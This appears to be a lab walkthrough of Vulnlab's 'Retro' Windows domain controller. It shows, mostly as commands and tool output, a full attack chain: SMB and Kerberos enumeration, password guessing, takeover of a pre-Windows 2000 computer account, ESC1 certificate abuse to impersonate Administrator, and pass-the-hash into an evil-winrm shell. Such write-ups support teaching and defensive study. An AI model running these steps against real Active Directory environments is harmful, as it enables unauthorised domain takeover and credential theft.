# Introduction

This walkthrough demonstrates the complete exploitation of the Vulnlab’s `Retro` machine, which simulates a Windows Active Directory environment with Certificate Services vulnerabilities. The target machine represents a domain controller running Windows Server 2022 with various services exposed, including `SMB`, `LDAP`, `Kerberos`, and `Active Directory Certificate Services (ADCS)`.

### Target Information

- **Target IP**: `10.10.83.167`
- **Domain**: `retro.vl`
- **Domain Controller**: `DC.retro.vl`
- **Operating System**: `Windows Server 2022 Build 20348`

### Attack Path Overview

The exploitation follows a systematic approach targeting `Active Directory Certificate Services (ADCS)` vulnerabilities:

1. **Initial Reconnaissance**: Port scanning and service enumeration.
2. **SMB Enumeration**: Discovering accessible shares and gathering intelligence.
3. **User Discovery**: Identifying valid domain users through Kerberos enumeration.
4. **Credential Discovery**: Finding weak credentials through dictionary attacks.
5. **Pre-Windows 2000 Computer Account Exploitation**: Leveraging legacy computer account configuration.
6. **Certificate Services Abuse**: Exploiting ESC1 vulnerability in ADCS templates.
7. **Administrator Access**: Using certificate authentication to obtain Domain Admin privileges.

The attack leverages a combination of weak password policies, legacy system configurations, and certificate template misconfigurations to achieve full domain compromise.

---

# Phase 1: Initial Reconnaissance

Our reconnaissance begins with comprehensive port scanning to identify the attack surface of the target domain controller.

### Port Scanning

```
sudo nmap -sS -sV 10.10.83.167 -T4

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-23 09:48:12Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
```

The initial scan reveals a classic Windows Domain Controller configuration with all expected services running. The presence of `Kerberos` (88), `LDAP` (389/636), and `SMB` (445) confirms this is an Active Directory environment.

### Detailed Service Enumeration

```
sudo nmap -sS -sV -sC -p139,445,464,593,636,3268,3269,3389 10.10.83.167

PORT     STATE SERVICE       VERSION
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2025-08-23T09:37:56
|_Not valid after:  2026-08-23T09:37:56
|_ssl-date: TLS randomness does not represent time
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2025-08-23T09:37:56
|_Not valid after:  2026-08-23T09:37:56
|_ssl-date: TLS randomness does not represent time
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2025-08-23T09:37:56
|_Not valid after:  2026-08-23T09:37:56
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC.retro.vl
| Not valid before: 2025-08-22T09:46:54
|_Not valid after:  2026-02-21T09:46:54
|_ssl-date: 2025-08-23T09:56:53+00:00; -1m34s from scanner time.
| rdp-ntlm-info:
|   Target_Name: RETRO
|   NetBIOS_Domain_Name: RETRO
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: retro.vl
|   DNS_Computer_Name: DC.retro.vl
|   DNS_Tree_Name: retro.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-08-23T09:56:13+00:00
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2025-08-23T09:56:17
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: mean: -1m34s, deviation: 0s, median: -1m34s
```

The detailed scan provides crucial information about the domain structure, confirming the domain name `retro.vl` and hostname `DC.retro.vl`. The SMB signing requirement indicates a properly configured domain environment.

---

# Phase 2: SMB Enumeration

With the basic network topology mapped, we proceed to enumerate SMB shares to identify potential information disclosure vectors.

### Share Discovery

```
smbclient -L \\\\10.10.83.167\\ -U ''

Password for [WORKGROUP\]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        Notes           Disk
        SYSVOL          Disk      Logon server share
        Trainees        Disk
```

The share enumeration reveals two non-standard shares: `Notes` and `Trainees`. These custom shares often contain sensitive information and represent our primary target for information gathering.

### Share Permissions Assessment

```
netexec smb 10.10.83.167 -u 'test' -p '' --shares

SMB         10.10.83.167    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         10.10.83.167    445    DC               [+] retro.vl\test: (Guest)
SMB         10.10.83.167    445    DC               [*] Enumerated shares
SMB         10.10.83.167    445    DC               Share           Permissions     Remark
SMB         10.10.83.167    445    DC               -----           -----------     ------
SMB         10.10.83.167    445    DC               ADMIN$                          Remote Admin
SMB         10.10.83.167    445    DC               C$                              Default share
SMB         10.10.83.167    445    DC               IPC$            READ            Remote IPC
SMB         10.10.83.167    445    DC               NETLOGON                        Logon server share
SMB         10.10.83.167    445    DC               Notes
SMB         10.10.83.167    445    DC               SYSVOL                          Logon server share
SMB         10.10.83.167    445    DC               Trainees        READ

```

The enumeration reveals that the `Trainees` share is readable by guest users, providing an immediate avenue for information gathering without authentication.

### Information Gathering from Trainees Share

```
smbclient \\\\10.10.83.167\\Trainees -U ''

Password for [WORKGROUP\]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Jul 23 23:58:43 2023
  ..                                DHS        0  Wed Jul 26 11:54:14 2023
  Important.txt                       A      288  Mon Jul 24 00:00:13 2023

                6261499 blocks of size 4096. 2230610 blocks available

smb: \> get Important.txt
getting file \Important.txt of size 288 as Important.txt (1.5 KiloBytes/sec) (average 1.5 KiloBytes/sec)
```

### Critical Intelligence Discovery

Let’s read the file content.

```
Dear Trainees,

I know that some of you seemed to struggle with remembering strong and unique passwords.
So we decided to bundle every one of you up into one account.
Stop bothering us. Please. We have other stuff to do than resetting your password every day.

Regards

The Admins
```

This document reveals a critical security weakness: the organization has implemented a shared account system for trainees, likely with weak password policies. This suggests that credential attacks against the `trainee` account may be successful.

---

# Phase 3: User Enumeration

With initial intelligence gathered, we proceed to enumerate valid domain users through Kerberos pre-authentication attacks.

### Kerberos User Enumeration

```
~/Tools/kerbrute_linux_amd64 userenum /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.83.167 --domain RETRO.VL

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 08/23/25 - Ronnie Flathers @ropnop

2025/08/23 12:03:15 >  Using KDC(s):
2025/08/23 12:03:15 >   10.10.83.167:88

2025/08/23 12:03:18 >  [+] VALID USERNAME:       guest@RETRO.VL
2025/08/23 12:03:25 >  [+] VALID USERNAME:       administrator@RETRO.VL
2025/08/23 12:04:54 >  [+] VALID USERNAME:       tblack@RETRO.VL
2025/08/23 12:05:18 >  [+] VALID USERNAME:       banking@RETRO.VL
2025/08/23 12:06:51 >  [+] VALID USERNAME:       trainee@RETRO.VL
2025/08/23 12:35:44 >  [+] VALID USERNAME:       jburley@RETRO.VL
```

The Kerberos enumeration reveals several valid usernames, including the `trainee` account mentioned in the intelligence document. The presence of a `banking` user is particularly interesting and may indicate additional attack vectors.

### RID Brute Force Enumeration

```
netexec smb 10.10.83.167 -u 'guest' -p '' --rid-brute

SMB         10.10.83.167    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         10.10.83.167    445    DC               [+] retro.vl\guest:
SMB         10.10.83.167    445    DC               498: RETRO\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.83.167    445    DC               500: RETRO\Administrator (SidTypeUser)
SMB         10.10.83.167    445    DC               501: RETRO\Guest (SidTypeUser)
SMB         10.10.83.167    445    DC               502: RETRO\krbtgt (SidTypeUser)
SMB         10.10.83.167    445    DC               512: RETRO\Domain Admins (SidTypeGroup)
SMB         10.10.83.167    445    DC               513: RETRO\Domain Users (SidTypeGroup)
SMB         10.10.83.167    445    DC               514: RETRO\Domain Guests (SidTypeGroup)
SMB         10.10.83.167    445    DC               515: RETRO\Domain Computers (SidTypeGroup)
SMB         10.10.83.167    445    DC               516: RETRO\Domain Controllers (SidTypeGroup)
SMB         10.10.83.167    445    DC               517: RETRO\Cert Publishers (SidTypeAlias)
SMB         10.10.83.167    445    DC               518: RETRO\Schema Admins (SidTypeGroup)
SMB         10.10.83.167    445    DC               519: RETRO\Enterprise Admins (SidTypeGroup)
SMB         10.10.83.167    445    DC               520: RETRO\Group Policy Creator Owners (SidTypeGroup)
SMB         10.10.83.167    445    DC               521: RETRO\Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.83.167    445    DC               522: RETRO\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.10.83.167    445    DC               525: RETRO\Protected Users (SidTypeGroup)
SMB         10.10.83.167    445    DC               526: RETRO\Key Admins (SidTypeGroup)
SMB         10.10.83.167    445    DC               527: RETRO\Enterprise Key Admins (SidTypeGroup)
SMB         10.10.83.167    445    DC               553: RETRO\RAS and IAS Servers (SidTypeAlias)
SMB         10.10.83.167    445    DC               571: RETRO\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.10.83.167    445    DC               572: RETRO\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.10.83.167    445    DC               1000: RETRO\DC$ (SidTypeUser)
SMB         10.10.83.167    445    DC               1101: RETRO\DnsAdmins (SidTypeAlias)
SMB         10.10.83.167    445    DC               1102: RETRO\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.83.167    445    DC               1104: RETRO\trainee (SidTypeUser)
SMB         10.10.83.167    445    DC               1106: RETRO\BANKING$ (SidTypeUser)
SMB         10.10.83.167    445    DC               1107: RETRO\jburley (SidTypeUser)
SMB         10.10.83.167    445    DC               1108: RETRO\HelpDesk (SidTypeGroup)
SMB         10.10.83.167    445    DC               1109: RETRO\tblack (SidTypeUser)
```

The RID brute force reveals additional crucial information, including the presence of a `BANKING$` computer account (`RID 1106`). Computer accounts ending with `$` are typically used for domain-joined computers and represent potential attack vectors.

---

# Phase 4: Credential Discovery

Based on the intelligence gathered about weak password policies, we attempt dictionary attacks against identified users.

### Dictionary Attack

```
netexec smb 10.10.83.167 -u ./users.txt -p ./users.txt

SMB         10.10.83.167    445    DC         [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         10.10.83.167    445    DC         [+] retro.vl\trainee:trainee
```

The dictionary attack successfully identifies valid credentials: `trainee:trainee`. This confirms the weak password policy indicated in the intelligence document, where the shared trainee account uses the username as the password.

---

# Phase 5: Authenticated Enumeration

With valid credentials obtained, we can now access additional resources and gather more detailed intelligence about the environment.

### Authenticated Share Access

```
netexec smb 10.10.83.167 -u 'trainee' -p 'trainee' --shares

SMB         10.10.83.167    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         10.10.83.167    445    DC               [+] retro.vl\trainee:trainee
SMB         10.10.83.167    445    DC               [*] Enumerated shares
SMB         10.10.83.167    445    DC               Share           Permissions     Remark
SMB         10.10.83.167    445    DC               -----           -----------     ------
SMB         10.10.83.167    445    DC               ADMIN$                          Remote Admin
SMB         10.10.83.167    445    DC               C$                              Default share
SMB         10.10.83.167    445    DC               IPC$            READ            Remote IPC
SMB         10.10.83.167    445    DC               NETLOGON        READ            Logon server share
SMB         10.10.83.167    445    DC               Notes           READ
SMB         10.10.83.167    445    DC               SYSVOL          READ            Logon server share
SMB         10.10.83.167    445    DC               Trainees        READ

```

With authenticated access, we can now read the `Notes` share, which was previously inaccessible.

### Critical Intelligence from Notes Share

```
smbclient \\\\10.10.83.167\\Notes -U 'trainee'

Password for [WORKGROUP\trainee]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Jul 24 00:03:16 2023
  ..                                DHS        0  Wed Jul 26 11:54:14 2023
  ToDo.txt                            A      248  Mon Jul 24 00:05:56 2023

                6261499 blocks of size 4096. 2869495 blocks available
smb: \> get ToDo.txt
getting file \ToDo.txt of size 248 as ToDo.txt (1.3 KiloBytes/sec) (average 1.3 KiloBytes/sec)
```

```
Thomas,
after convincing the finance department to get rid of their ancienct banking software
it is finally time to clean up the mess they made. We should start with the pre created
computer account. That one is older than me.

Best
James
```

This document provides crucial intelligence about a `pre-created computer account` associated with the banking software. This likely refers to the `BANKING$` computer account discovered earlier, and suggests it may be configured with legacy security settings.

---

# Phase 6: Pre-Windows 2000 Computer Account Exploitation

The note about the "pre-created computer account" suggests this system uses legacy `Pre-Windows 2000` compatibility mode for computer accounts. In this configuration, computer account passwords are set to the lowercase computer name without the trailing `$`. We can confirm this by using `BloodHound`.

![Screenshot 2025-08-23 152535.png](attachment:c635f1c9-8493-458d-b406-f07145f1aae0:Screenshot_2025-08-23_152535.png)

### Understanding Pre-Windows 2000 Computer Accounts

When a computer account is configured as `Pre-Windows 2000 Computer`, its password is set based on its name (lowercase computer name without the trailing `$`). When it isn't, the password is randomly generated. This represents a significant security vulnerability.

### Testing Legacy Computer Account Credentials

```
netexec smb 10.10.83.167 -u BANKING$ -p banking

SMB         10.10.83.167    445    DC         [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         10.10.83.167    445    DC         [-] retro.vl\BANKING$:banking STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT

netexec smb 10.10.83.167 -u BANKING$ -p randompass
SMB         10.10.83.167    445    DC         [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         10.10.83.167    445    DC         [-] retro.vl\BANKING$:randompass STATUS_LOGON_FAILURE
```

The different error messages (`STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT` vs `STATUS_LOGON_FAILURE`) indicate that the password `banking` is correct, but the account has login restrictions. However, we can still use these credentials for Kerberos authentication.

### Kerberos Configuration

```
sudo nano /etc/krb5.conf

[libdefaults]
        default_realm = RETRO.VL
        dns_lookup_realm = false
        ticket_lifetime = 24h
        renew_lifetime = 7d
        rdns = false
        kdc_timesync = 1
        ccache_type = 4
        forwardable = true
        proxiable = true

# The following libdefaults parameters are only for Heimdal Kerberos.
        fcc-mit-ticketflags = true

[realms]
        RETRO.VL = {
                kdc = DC.RETRO.VL
                admin_server = DC.RETRO.VL
        }
```

### Kerberos Authentication and Password Reset

```
kinit 'BANKING$@RETRO.VL'
Password for BANKING$@RETRO.VL:

klist
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: BANKING$@RETRO.VL

Valid starting       Expires              Service principal
08/23/2025 15:29:17  08/24/2025 01:29:17  krbtgt/RETRO.VL@RETRO.VL
        renew until 08/24/2025 15:29:13
```

Successfully obtaining a Kerberos ticket confirms that the `BANKING$` account credentials are valid. We can now change the password to gain more reliable access.

```
kpasswd BANKING$
Password for BANKING$@RETRO.VL:
Enter new password:
Enter it again:
Password changed.
```

The password change operation succeeds, giving us full control over the `BANKING$` computer account with our chosen password.

---

# Phase 7: Certificate Services Discovery

With control of a computer account, we can now enumerate `Active Directory Certificate Services (ADCS)` infrastructure, which often presents privilege escalation opportunities.

### ADCS Enumeration

```
netexec ldap 10.10.83.167 -u BANKING$ -p 'newpassword' -M adcs -o SERVER=retro-DC-CA

LDAP        10.10.83.167    389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:retro.vl) (signing:None) (channel binding:Never)
LDAP        10.10.83.167    389    DC               [+] retro.vl\BANKING$:silver88
ADCS        10.10.83.167    389    DC               Using PKI CN: retro-DC-CA
ADCS        10.10.83.167    389    DC               [*] Starting LDAP search with search filter '(distinguishedName=CN=retro-DC-CA,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,'
ADCS        10.10.83.167    389    DC               Found Certificate Template: RetroClients
ADCS        10.10.83.167    389    DC               Found Certificate Template: DirectoryEmailReplication
ADCS        10.10.83.167    389    DC               Found Certificate Template: DomainControllerAuthentication
ADCS        10.10.83.167    389    DC               Found Certificate Template: KerberosAuthentication
ADCS        10.10.83.167    389    DC               Found Certificate Template: EFSRecovery
ADCS        10.10.83.167    389    DC               Found Certificate Template: EFS
ADCS        10.10.83.167    389    DC               Found Certificate Template: DomainController
ADCS        10.10.83.167    389    DC               Found Certificate Template: WebServer
ADCS        10.10.83.167    389    DC               Found Certificate Template: Machine
ADCS        10.10.83.167    389    DC               Found Certificate Template: User
ADCS        10.10.83.167    389    DC               Found Certificate Template: SubCA
ADCS        10.10.83.167    389    DC               Found Certificate Template: Administrator
```

The enumeration reveals an active Certificate Authority (`retro-DC-CA`) with multiple certificate templates available, including a custom `RetroClients` template that warrants further investigation.

### Detailed Certificate Services Analysis

```
certipy-ad find -u BANKING$ -p 'newpassword' -stdout -dc-ip 10.10.83.167

Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 15 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'retro-DC-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'retro-DC-CA'
[*] Checking web enrollment for CA 'retro-DC-CA' @ 'DC.retro.vl'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : retro-DC-CA
    DNS Name                            : DC.retro.vl
    Certificate Subject                 : CN=retro-DC-CA, DC=retro, DC=vl
    Certificate Serial Number           : 7A107F4C115097984B35539AA62E5C85
    Certificate Validity Start          : 2023-07-23 21:03:51+00:00
    Certificate Validity End            : 2028-07-23 21:13:50+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : RETRO.VL\Administrators
      Access Rights
        ManageCa                        : RETRO.VL\Administrators
                                          RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        ManageCertificates              : RETRO.VL\Administrators
                                          RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        Enroll                          : RETRO.VL\Authenticated Users
Certificate Templates
  0
    Template Name                       : RetroClients
    Display Name                        : Retro Clients
    Certificate Authorities             : retro-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 4096
    Template Created                    : 2023-07-23T21:17:47+00:00
    Template Last Modified              : 2023-07-23T21:18:39+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : RETRO.VL\Domain Admins
                                          RETRO.VL\Domain Computers
                                          RETRO.VL\Enterprise Admins
      Object Control Permissions
        Owner                           : RETRO.VL\Administrator
        Full Control Principals         : RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        Write Owner Principals          : RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        Write Dacl Principals           : RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        Write Property Enroll           : RETRO.VL\Domain Admins
                                          RETRO.VL\Domain Computers
                                          RETRO.VL\Enterprise Admins
    [+] User Enrollable Principals      : RETRO.VL\Domain Computers
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
```

### Critical Vulnerability Discovery: ESC1

The `Certipy` analysis reveals a critical `ESC1` vulnerability in the `RetroClients` certificate template. This vulnerability occurs when:

1. `Enrollee Supplies Subject` is enabled (`True`).
2. The template allows `Client Authentication`.
3. Domain Computers have enrollment rights.

This configuration allows any domain computer (including our compromised `BANKING$` account) to request a certificate for any user, including Domain Administrators, by specifying an arbitrary `Subject Alternative Name (SAN)`.

---

# Phase 8: ESC1 Exploitation

With the `ESC1` vulnerability identified, we can now exploit it to impersonate the Domain Administrator and achieve full domain compromise.

### Certificate Request for Administrator

```
certipy-ad req -dc-ip 10.10.83.167 -u 'BANKING -p 'newpassword' -ca retro-DC-CA -template RetroClients -upn Administrator -key-size 4096

Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 9
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

The certificate request succeeds, providing us with a valid certificate that can be used to authenticate as the Domain Administrator. The certificate is saved as `administrator.pfx` and contains both the public certificate and private key.

### Time Synchronization

Before proceeding with certificate authentication, we must ensure our system clock is synchronized with the domain controller to avoid Kerberos authentication failures.

```
sudo rdate -n 10.10.70.230
Sat Aug 23 15:59:32 CEST 2025
```

### Certificate Authentication

```
certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.83.167 -username administrator -domain retro.vl

Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*] SAN UPN: 'Administrator'
[*] Using principal: 'administrator@retro.vl'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@retro.vl': aad3b435b51404eeaad3b435b51404ee:252fac7066d.................
```

The certificate authentication is successful, providing us with:

1. A valid `Kerberos TGT` for the Administrator account
2. The `NTLM` hash for the Administrator account: `252fac7066d.................`

---

# Phase 9: Domain Administrator Access

With the Administrator's NTLM hash obtained, we can now authenticate using `Pass-the-Hash` techniques to gain full administrative access to the domain.

### Administrative Access Verification

```
netexec smb 10.10.83.167 -u 'Administrator' -H '252fac7066d.................'

SMB         10.10.83.167    445    DC         [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         10.10.83.167    445    DC         [+] retro.vl\Administrator:252fac7066d................. (Pwn3d!)
```

The `(Pwn3d!)` indicator confirms that we have full administrative privileges on the domain controller, effectively compromising the entire domain.

### Interactive Shell Access

```
evil-winrm -i 10.10.83.167 -u 'Administrator' -H '252fac7066d.................'
```

This command establishes an interactive PowerShell session on the domain controller with full administrative privileges, providing complete control over the domain environment.

---

## Conclusion

This walkthrough demonstrated a complete Active Directory compromise through the exploitation of multiple security weaknesses:

1. **Information Disclosure**: Accessible SMB shares revealed critical intelligence about weak password policies and legacy system configurations.
2. **Weak Authentication**: Dictionary attacks successfully compromised the shared trainee account.
3. **Legacy System Configurations**: Pre-Windows 2000 computer account settings allowed predictable password exploitation.
4. **Certificate Services Vulnerabilities**: ESC1 misconfiguration in ADCS templates enabled privilege escalation.
5. **Pass-the-Hash**: NTLM hash extraction facilitated full domain administrative access.

### Key Takeaways

- **Defense in Depth**: Multiple security layers failed, allowing the attack to progress from initial reconnaissance to full domain compromise.
- **Legacy Configurations**: Pre-Windows 2000 compatibility settings create significant security risks in modern environments.
- **Certificate Services Security**: ADCS misconfigurations represent critical attack vectors that require careful template management.
- **Information Security**: Accessible file shares can provide attackers with valuable intelligence for subsequent attack phases.

The successful exploitation demonstrates the importance of comprehensive security assessments, proper certificate template configurations, and regular security audits of legacy system settings in Active Directory environments.
